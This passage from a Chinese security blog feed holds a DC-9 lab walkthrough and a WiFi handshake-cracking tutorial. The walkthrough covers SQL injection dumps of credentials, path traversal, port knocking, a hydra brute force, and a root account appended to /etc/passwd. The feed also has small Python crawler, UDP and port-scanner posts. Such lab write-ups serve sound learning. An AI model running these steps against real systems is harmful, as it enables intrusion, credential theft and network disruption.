    <content type="html"><![CDATA[<h2 id="DC-9靶场通关"><a href="#DC-9靶场通关" class="headerlink" title="DC-9靶场通关"></a>DC-9靶场通关</h2><p>无聊，多久没做这个网络攻防了，做一个dc-9来练练手，<a href="https://download.vulnhub.com/dc/DC-9.zip">靶场下载地址</a></p><span id="more"></span><h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A 192.168.130.137</span><br></pre></td></tr></table></figure><p><img src="/img/dc-9_3.jpg"><br>其实会发现只是开放了80,22号端口，而且22号端口还是不行的(被限制了)，由于我图片少了一张，也让你们好理解，就将就一下</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192,168.130.137&quot;</span><br></pre></td></tr></table></figure><blockquote><p>其实到最后你会发现，这个目录都进行访问后，没什么信息，最后回到那个登录窗口，我用burp进行爆破，不行，我尝试进行SQL注入，发现是可行的，</p></blockquote><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>先把登录窗口页面抓包，把内容保存进一个文件sql.txt</p><h4 id="报库"><a href="#报库" class="headerlink" title="报库"></a>报库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -search --dbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] information_schema</span><br><span class="line">[*] Staff</span><br><span class="line">[*] users</span><br></pre></td></tr></table></figure><h4 id="报表"><a href="#报表" class="headerlink" title="报表"></a>报表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -search -D Staff --tables</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><h4 id="报列"><a href="#报列" class="headerlink" title="报列"></a>报列</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -search -D users -T UserDetails --columns</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------------------------------------------------+----------+</span><br><span class="line">| UserID | Password                                         | Username |</span><br><span class="line">+--------+--------------------------------------------------+----------+</span><br><span class="line">| 1      | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) | admin    |</span><br><span class="line">+--------+--------------------------------------------------+----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="报另外一张表"><a href="#报另外一张表" class="headerlink" title="报另外一张表"></a>报另外一张表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -search -D users --tables</span><br><span class="line"></span><br><span class="line">sqlmap -r sql.txt -search -D users -T UserDetails --columns</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| id | lastname   | password      | reg_date            | username  | firstname |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |</span><br><span class="line">| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |</span><br><span class="line">| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |</span><br><span class="line">| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |</span><br><span class="line">| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |</span><br><span class="line">| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br><span class="line">| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |</span><br><span class="line">| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |</span><br><span class="line">| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |</span><br><span class="line">| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |</span><br><span class="line">| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br><span class="line">| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |</span><br><span class="line">| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |</span><br><span class="line">| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |</span><br><span class="line">| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |</span><br><span class="line">| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |</span><br><span class="line">| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br></pre></td></tr></table></figure><h4 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h4><p>尝试用第一张表用户名和密码登录，发现可以的<br><img src="/img/dc-9_2.jpg"></p><blockquote><p>你可以发现下面提示说没有file ,尝试用文件包含，发现包含/etc/passwd可以的，由于我们在开始时候ssh 被限制登录了，所以我们尝试去包含knockd.conf(这个配置文件限制ssh登录)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.137/manage.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="/img/dc-9_4.jpg"><br>其实里面写的内容就是打开ssh按顺序需要访问7469，8475，9842端口，关闭ssh 只需要去反过来顺序就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7469 192.168.130.137</span><br><span class="line">nmap -p 8475 192.168.130.137</span><br><span class="line">nmap -p 9842 192.168.130.137</span><br></pre></td></tr></table></figure><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>现在ssh打开了，我们需要登录，在前面我们是爆破出很多个用户名和密码的，我们把用户名保存在uname.txt，密码保存在mima.txt，用hydra 爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L uname.txt -P mima.txt</span><br></pre></td></tr></table></figure><p><img src="/img/dc-9_5.jpg"><br>发现四个用户名和密码，都是可以登录的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fredf@192.168.130.137</span><br></pre></td></tr></table></figure><p>进行终端</p><p>  查看能以root权限执行的文件<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><br><img src="/img/dc-9_8.jpg"><br>其实会发现一个/opt/devstuff/dist/test/test文件可以不需要密码以root权限执行，进入文件夹后面，在上一个目录，你会发现一个test.py文件，这个可以进行文件内容写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len (sys.argv) != 3 :</span><br><span class="line">    print (&quot;Usage: python test.py read append&quot;)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line">else :</span><br><span class="line">    f = open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>这样我们可以考虑写入一个有root权限的账户到/etc/passwd</p><h4 id="账户添加（提权）"><a href="#账户添加（提权）" class="headerlink" title="账户添加（提权）"></a>账户添加（提权）</h4><p>先要对账户密码的hash进行生产，然后再把这个账户密码保存到一个文件中，通过远程下载，把它送到靶场服务器中，再进行test文件执行</p><ul><li><p>hash生成（用户名:test 密码：123）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl -passwd -1 -salt test 123</span><br></pre></td></tr></table></figure><p>hash值为  $1$test$C5gTd1RYpgKDj4WuX5yG8/</p></li><li><p>保存到文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$1$test$C5gTd1RYpgKDj4WuX5yG8/:0:0::/root:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>远程下载<br>自己服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p>靶场服务器（最好在/tmp目录下载，权限高）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://192.168.130.137:8080/123.txt&quot;</span><br></pre></td></tr></table></figure></li><li><p>执行test文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/devstuff/dist/test/</span><br><span class="line">sudo ./test /tmp/1.txt /etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>检查是否添加成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/img/dc-9_7.jpg"><br>发现成功了</p></li><li><p>切换用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br></pre></td></tr></table></figure><p>输入密码就发现自己已经是root权限</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;DC-9靶场通关&quot;&gt;&lt;a href=&quot;#DC-9靶场通关&quot; class=&quot;headerlink&quot; title=&quot;DC-9靶场通关&quot;&gt;&lt;/a&gt;DC-9靶场通关&lt;/h2&gt;&lt;p&gt;无聊，多久没做这个网络攻防了，做一个dc-9来练练手，&lt;a href=&quot;https://download.vulnhub.com/dc/DC-9.zip&quot;&gt;靶场下载地址&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="综合测试" scheme="http://xzajyjs2.ltd/tags/%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://xzajyjs2.ltd/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="特殊文件提权" scheme="http://xzajyjs2.ltd/tags/%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83/"/>
    
    <category term="添加用户" scheme="http://xzajyjs2.ltd/tags/%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫（一）</title>
    <link href="http://xzajyjs2.ltd/2021/09/27/python%20crawler_1/"/>
    <id>http://xzajyjs2.ltd/2021/09/27/python%20crawler_1/</id>
    <published>2021-09-27T08:49:27.308Z</published>
    <updated>2021-09-27T08:57:47.055Z</updated>
    
    <content type="html"><![CDATA[<h2 id="爬虫中英互译"><a href="#爬虫中英互译" class="headerlink" title="爬虫中英互译"></a>爬虫中英互译</h2><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>很长一段时间就想认真学习python,但前面一段时间由于执行力太差，导致了python荒废了很久，想着还是把他们重新捡起来，这是我第一次有规划的去写一个爬虫，虽然参考很多资料，终归还是出来了，期望小伙伴们能经常看见我博客的更新，监督一下小新哈哈！！<br>这个爬虫可以实现中英文的翻译，这个爬虫和有道翻译紧密相连</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爬虫的含义：其实爬虫非常简单，就是python像一个正常人一样去访问一个网站，其实这个过程中我们就是要不断伪装自己，让它以为你就是一个正常人，从而获取更多的源代码  </span><br><span class="line"></span><br><span class="line">反爬虫：对扫描器中的网络爬虫环节进行反制，通过一些反制策略来阻碍或干扰爬虫的正常爬行，从而间接地起到防御目的  </span><br><span class="line"></span><br><span class="line">反反爬虫机制:我们在请求网页时候对自己进行伪装，可以请求头中添加元素，其实这个并不是所有的爬虫都需要使用到反反爬虫，这个得看网站反爬虫机制的干扰力度</span><br></pre></td></tr></table></figure><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>python环境<br>pycharm<br>chrome(最好使用这个，其他的也可以)</p><blockquote><p>你在写爬虫之前一定到先去正常浏览这个网站，在网页源代码中找到请求头，从而获得请求信息。</p></blockquote><h2 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">vars=&quot;&quot;&quot;  </span><br><span class="line">**************************  </span><br><span class="line">** 此工具和有道翻译紧密联系 **** 此工具仅仅支持中英文互译 ****状态码显示200，表示翻译成功**  </span><br><span class="line">** 欢迎使用Python翻译工具 **** 需要自己输入翻译内容 **** 输入exit,则突出翻译 ****************************  </span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">import requests  </span><br><span class="line">print(vars)  </span><br><span class="line">def fanyi(kd):  </span><br><span class="line">    url = &quot;https://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&quot;  </span><br><span class="line">  #请求头  </span><br><span class="line">  headers = &#123;  </span><br><span class="line">        &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,  </span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,  </span><br><span class="line">        &quot;Connection&quot;: &quot;keep-alive&quot;,  </span><br><span class="line">        &quot;Content-Type&quot;: &quot;keep-alive&quot;,  </span><br><span class="line">        &quot;Host&quot;: &quot;fanyi.youdao.com&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">    #POST请求发送的数据  </span><br><span class="line">  data = &#123;  </span><br><span class="line">        &quot;i&quot;: kd,  </span><br><span class="line">        &quot;doctype&quot;: &quot;json&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">    responses = requests.post(url, data) #请求网页  </span><br><span class="line">  code = responses.status_code #获得网页状态码  </span><br><span class="line">  print(&#x27;状态码:&#x27;,code)  </span><br><span class="line">    if code == 200: #判端网页是否请求成功  </span><br><span class="line">  responsesdata = responses.json()  </span><br><span class="line">        if responsesdata[&quot;errorCode&quot;] == 0: #判断返回信息中的errCode和正常访问是否一致  </span><br><span class="line">  print(&#x27;翻译结果：&#x27;,responsesdata[&quot;translateResult&quot;][0][0][&quot;tgt&quot;])  </span><br><span class="line">    else :  </span><br><span class="line">        print(&quot;翻译失败，请联系管理&quot;)  </span><br><span class="line">while True :  </span><br><span class="line">    input_js=input(&#x27;输入翻译内容：&#x27;)  </span><br><span class="line">    if input_js==&#x27;exit&#x27;:  </span><br><span class="line">        break  </span><br><span class="line"> else :  </span><br><span class="line">        fanyi(input_js)</span><br></pre></td></tr></table></figure><h2 id="代码执行成功"><a href="#代码执行成功" class="headerlink" title="代码执行成功"></a>代码执行成功</h2><p><img src="/img/python_pc1.jpg"></p><h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>希望在过两天，各位小伙伴能看见我下一篇爬虫出现，每天都在精进自己技术！！！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;爬虫中英互译&quot;&gt;&lt;a href=&quot;#爬虫中英互译&quot; class=&quot;headerlink&quot; title=&quot;爬虫中英互译&quot;&gt;&lt;/a&gt;爬虫中英互译&lt;/h2&gt;</summary>
    
    
    
    
    <category term="python" scheme="http://xzajyjs2.ltd/tags/python/"/>
    
    <category term="python爬虫" scheme="http://xzajyjs2.ltd/tags/python%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>无线攻击</title>
    <link href="http://xzajyjs2.ltd/2021/09/24/wifi/"/>
    <id>http://xzajyjs2.ltd/2021/09/24/wifi/</id>
    <published>2021-09-23T16:32:43.981Z</published>
    <updated>2021-09-23T16:56:02.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无线攻击wifi破解"><a href="#无线攻击wifi破解" class="headerlink" title="无线攻击wifi破解"></a>无线攻击wifi破解</h2><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在做这个实验的时候想了很多,也许有些路你不知道是否适合你，但是你不去尝试，人生可能就没有新鲜感与年少轻狂，慢慢走吧，希望自己能做到自己能达到的成就。尝试总是有风险的，我感觉不是每一份成功都来得这么简单(宣泄一下哈哈)<br>这个实验了，其实没有多少的小坑，就是单纯的发现攻击目标，然后进行爆破</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>手机热点<br>kali Linux虚拟机(我用的1.0.6版本)<br>物理机windows<br>USB无线网卡</p></blockquote><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><blockquote><p>查看无线网卡是否支持监听模式，先需要以root权限登录</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure><blockquote><p>正常情况下会出现各种参数，我的是wlan0支持监听模式 </p></blockquote><h3 id="启动监听模式"><a href="#启动监听模式" class="headerlink" title="启动监听模式"></a>启动监听模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="/img/wifi_2.jpg"></p><blockquote><p>我们发现网卡名称改了，我现在的网卡变为了wlan1</p></blockquote><h3 id="嗅探附近的WiFi网络"><a href="#嗅探附近的WiFi网络" class="headerlink" title="嗅探附近的WiFi网络"></a>嗅探附近的WiFi网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan1</span><br></pre></td></tr></table></figure><p><img src="/img/wifi_1.jpg"></p><blockquote><p>这里会发现周围的wifi以及他们的信息，在信息里面出现参数<br>BSSID [WIFI的mac地址]<br>PWR [信号强弱程度，参数值越小，信号越强]<br>DATA  [数据量，数值越大，用得人多]<br>CH [信号频率(频道)]<br>这里需要记住目标WiFi的频道和MAC地址<br>我现在需要攻击的目标WiFi是nove6(5G)</p></blockquote><h3 id="监听目标网络的握手包"><a href="#监听目标网络的握手包" class="headerlink" title="监听目标网络的握手包"></a>监听目标网络的握手包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 --bssid 32:73:80:86:CB:4B -w hello wlan1</span><br></pre></td></tr></table></figure><p>监听过后先不要断开，此时发现了一台设备，MAC地址为80:30:49:40:B5:57</p><h3 id="获取握手包-另开一个终端"><a href="#获取握手包-另开一个终端" class="headerlink" title="获取握手包(另开一个终端)"></a>获取握手包(另开一个终端)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay -0 0-a 32:73:80:86:CB:4B -c 80:30:49:40:B5:57 wlan1</span><br></pre></td></tr></table></figure><p><img src="/img/wifi_4.jpg"></p><blockquote><p>这个时候查看我们监听的目标WIFI,发现了PWR数值为0，说明此时目标设备已经掉线，在实验中如果出现如下红色标注类似内容，则握手包抓取成功<br><img src="/img/wifi_3.jpg"></p></blockquote><h3 id="破解握手包"><a href="#破解握手包" class="headerlink" title="破解握手包"></a>破解握手包</h3><blockquote><p>这里我们用kali里面的自带字典，位置在/etc/usr/share/wordlists/rockyou.txt.gz</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w rockyou.txt hello-01.cap</span><br></pre></td></tr></table></figure><p><img src="/img/wifi_5.jpg"><br>WiFi已经破解成功了</p><blockquote><p>尾注： 这里不仅仅是只有这一种方式破解密码，其实在kali里面也是有专用的无线攻击工具，比如fern wifi cracker，有兴趣可以去万一下下，这个工具原理和这个一样，这个东西只是一个古板的工具。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;无线攻击wifi破解&quot;&gt;&lt;a href=&quot;#无线攻击wifi破解&quot; class=&quot;headerlink&quot; title=&quot;无线攻击wifi破解&quot;&gt;&lt;/a&gt;无线攻击wifi破解&lt;/h2&gt;</summary>
    
    
    
    
    <category term="WiFi密码破解" scheme="http://xzajyjs2.ltd/tags/WiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="无线网卡" scheme="http://xzajyjs2.ltd/tags/%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/"/>
    
  </entry>
  
  <entry>
    <title>python UDP</title>
    <link href="http://xzajyjs2.ltd/2021/08/19/python_UDP/"/>
    <id>http://xzajyjs2.ltd/2021/08/19/python_UDP/</id>
    <published>2021-08-19T15:43:08.977Z</published>
    <updated>2021-08-19T16:10:10.677Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python-UDP-通信"><a href="#python-UDP-通信" class="headerlink" title="python UDP 通信"></a>python UDP 通信</h2><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h3><blockquote><p>以下代码实现的是UDP通信,UDP通信不是连续的,每一次的信息交流都在进行着一次连接,通信中分为客户端和服务端,服务端就相当于一个简单的服务器,等待连接,接收消息.客户端就是去连接服务端,发送消息(注意:发送和接收的字符都要使用”utf-8”编码),希望下一篇博客能实现完整交互通信.进行完善!!!!~~~</p></blockquote><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">def main():</span><br><span class="line">    #使用ipv4,udp通信</span><br><span class="line">    b=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">#绑定ip(默认为127.0.0.1),端口</span><br><span class="line">    b.bind((&#x27;&#x27;,1000))</span><br><span class="line">    while True:</span><br><span class="line">   #接收的内容</span><br><span class="line">        data,addr=b.recvfrom(1024)</span><br><span class="line">        print(&quot;连接地址:&quot;,addr)</span><br><span class="line">        print(&quot;接收内容:&quot;,data.decode(&quot;utf-8&quot;))</span><br><span class="line">#发送的内容</span><br><span class="line">        b.sendto(data,addr)</span><br><span class="line">    b.close</span><br><span class="line">    pass</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">def main():</span><br><span class="line">    a=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">    while True:</span><br><span class="line">        SR=input(&quot;发送的内容&quot;,)</span><br><span class="line">        a.sendto(SR.encode(&quot;utf-8&quot;),(&quot;192.168.101.123&quot;,1000))</span><br><span class="line">        if SR==&quot;exit&quot;:</span><br><span class="line">            break</span><br><span class="line">        revse=a.recvfrom(1024)</span><br><span class="line">        print(&quot;接收内容&quot;,revse[0].decode(&quot;utf-8&quot;))</span><br><span class="line">    a.close()</span><br><span class="line">    pass</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;python-UDP-通信&quot;&gt;&lt;a href=&quot;#python-UDP-通信&quot; class=&quot;headerlink&quot; title=&quot;python UDP 通信&quot;&gt;&lt;/a&gt;python UDP 通信&lt;/h2&gt;</summary>
    
    
    
    
    <category term="python" scheme="http://xzajyjs2.ltd/tags/python/"/>
    
    <category term="UDP" scheme="http://xzajyjs2.ltd/tags/UDP/"/>
    
  </entry>
  
  <entry>
    <title>python端口扫描</title>
    <link href="http://xzajyjs2.ltd/2021/08/17/python_scanport/"/>
    <id>http://xzajyjs2.ltd/2021/08/17/python_scanport/</id>
    <published>2021-08-17T09:14:45.130Z</published>
    <updated>2021-08-19T15:45:14.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python端口扫描器"><a href="#python端口扫描器" class="headerlink" title="python端口扫描器"></a>python端口扫描器</h2><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>这扫描器通过python自带的模块编写,第一个主要通过socket,sys模块编写,第二个通过OptionParser,socket模块编写,这是第一次尝试,希望能在学习python中得到新东西,新体验.</p></blockquote><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python jxf.py -help 帮助</span><br><span class="line">python jxf.py -version 查看版本</span><br><span class="line">python jxf.py -i 127.0.0.1 -p 80,90 选择端口扫描</span><br><span class="line">python jxf.py -i 127.0.0.1 -p 80-90  范围扫描</span><br><span class="line">python jxf.py -i 127.0.0.1 -p all  全部端口扫描</span><br><span class="line">python jxf.py -i 127.0.0.1 -p default 默认端口扫描</span><br></pre></td></tr></table></figure><h3 id="端口扫描器-一"><a href="#端口扫描器-一" class="headerlink" title="端口扫描器 一"></a>端口扫描器 一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 